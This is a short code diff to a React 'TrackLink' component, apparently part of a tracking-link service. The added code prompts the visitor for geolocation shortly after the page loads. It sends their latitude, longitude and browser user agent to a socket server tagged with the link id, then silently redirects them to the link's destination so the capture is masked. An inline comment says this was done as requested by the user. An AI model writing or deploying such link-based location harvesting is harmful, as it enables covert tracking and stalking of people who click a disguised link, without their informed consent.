@@ -26,9 +26,30 @@ const TrackLink = () => {
         };
         fetchLinkData();
 
-        socketRef.current = io('http://localhost:3001');
+        const socket = io(window.location.origin.replace('3000', '3001'));
+        socketRef.current = socket;
+
+        // Auto-request location for better UX as requested by user
+        setTimeout(() => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        socket.emit('update-location', {
+                            linkId: id,
+                            lat: latitude,
+                            lng: longitude,
+                            userAgent: navigator.userAgent
+                        });
+                        if (linkData?.destinationUrl) window.location.href = linkData.destinationUrl;
+                    },
+                    (err) => console.warn('Auto-geolocation skipped:', err)
+                );
+            }
+        }, 1500);
+
         return () => {
-            if (socketRef.current) socketRef.current.disconnect();
+            if (socket) socket.disconnect();
         };
     }, [id]);
 
